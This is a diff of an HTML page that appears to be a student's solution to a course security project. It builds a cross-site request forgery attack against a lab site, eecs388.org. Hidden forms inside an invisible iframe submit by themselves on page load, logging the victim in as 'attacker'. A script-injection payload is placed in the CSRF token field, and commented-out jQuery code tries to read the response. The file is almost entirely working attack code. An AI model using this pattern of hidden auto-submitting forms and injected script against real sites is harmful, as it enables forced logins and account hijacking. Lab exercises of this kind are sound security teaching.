@@ -1,5 +1,6 @@
 <html><body>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="http://malsup.github.com/jquery.form.js"></script>
 
 <style>
     iframe, form, input{display: none}
@@ -7,16 +8,46 @@
 
 <iframe name='ohshitwatuptreverhiro'></iframe>
 
-<form method="post"
+<form id="thatform"
+      method="post"
       action="https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0"
       target='ohshitwatuptreverhiro'>
     <input name="username" value="attacker">
     <input name="password" value="l33th4x">
-    <input name="csrf_token" value="">
+    <input name="csrf_token" value="<script>alert(0);</script>">
+    <!-- <input name="csrf_token" value="3d778be430100a6a3134d41dd570a397"> -->
 </form>
 
+<form id="thisform"
+      method="get"
+      action="https://eecs388.org/project2/?csrfdefense=1&xssdefense=0"
+      target='ohshitwatuptreverhiro'>
+</form>
+
+
 <script>
-  $('form').submit();
+    // $('#thisform').ajaxForm({
+    //     success: function(data) {
+    //         console.log(data);
+    //     },
+    //     error: function(){
+    //         console.log('error');
+    //     }
+    // });
+    // $('#thisform').submit();
+    // $.ajax({
+    //     target: "ohshitwatuptreverhiro",
+    //     url: "https://eecs388.org/project2/?csrfdefense=1&xssdefense=0",
+    //     type: "GET",
+    //     dataType: "html",
+    //     success: function (data) {
+    //         console.log(data);
+    //     },
+    //     error: function(error) {
+    //         console.log(error);
+    //     }
+    // });
+    $('form').submit();
 </script>
 
 </body></html>
